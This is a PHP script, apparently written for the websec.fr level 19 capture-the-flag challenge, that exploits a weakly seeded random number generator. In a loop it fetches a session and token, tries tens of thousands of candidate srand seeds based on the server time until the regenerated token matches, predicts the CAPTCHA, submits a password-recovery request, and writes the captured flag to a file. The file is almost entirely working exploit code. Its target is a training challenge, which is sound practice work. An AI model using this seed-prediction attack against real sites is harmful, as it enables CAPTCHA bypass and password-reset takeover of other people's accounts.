<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║      PARALLEL ATTACK - Alternative Seed Interpretations    ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$attempt = 0;

while (true) {
    $attempt++;
    echo "\n[ATTEMPT $attempt] " . date('H:i:s') . "\n";
    
    // Obtener sesión
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    // Extraer timestamp del servidor del header Date si está disponible
    $server_time = time();
    if (preg_match('/^date:\s*([^\r\n]+)/im', $response, $date_match)) {
        $server_time = strtotime($date_match[1]);
    }
    
    echo "  Token: $real_token\n";
    echo "  Server time: $server_time\n";
    
    // Probar diferentes interpretaciones del microtime
    $seeds_to_test = [];
    
    // 1. Timestamps normales alrededor del tiempo del servidor
    for ($offset = -300; $offset <= 300; $offset++) {
        $seeds_to_test[] = $server_time + $offset;
    }
    
    // 2. Tal vez el servidor usa un timezone diferente (probar varios offsets comunes)
    $timezone_offsets = [-12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12];
    foreach ($timezone_offsets as $tz_offset) {
        $adjusted_time = $server_time + ($tz_offset * 3600);
        for ($offset = -60; $offset <= 60; $offset++) {
            $seeds_to_test[] = $adjusted_time + $offset;
        }
    }
    
    // 3. Tal vez están usando milisegundos en lugar de segundos
    $ms_base = $server_time * 1000;
    for ($offset = -1000; $offset <= 1000; $offset++) {
        $seeds_to_test[] = $ms_base + $offset;
    }
    
    // Eliminar duplicados
    $seeds_to_test = array_unique($seeds_to_test);
    
    echo "  Testing " . count($seeds_to_test) . " different seeds...\n";
    
    $tested = 0;
    foreach ($seeds_to_test as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        $tested++;
        
        if ($test_token === $real_token) {
            echo "\n  ✓✓✓ SEED FOUND: $seed ✓✓✓\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "  CAPTCHA: $captcha\n";
            echo "  Submitting...\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n╔════════════════════════════════════════════════════════════╗\n";
                echo "║                      SUCCESS!!!                            ║\n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "║  FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                    exit(0);
                }
            }
            break;
        }
        
        if ($tested % 5000 == 0) {
            echo "  Progress: $tested/" . count($seeds_to_test) . "\n";
        }
    }
    
    echo "  No match in this attempt\n";
    usleep(500000); // 0.5 segundos entre intentos
}
?>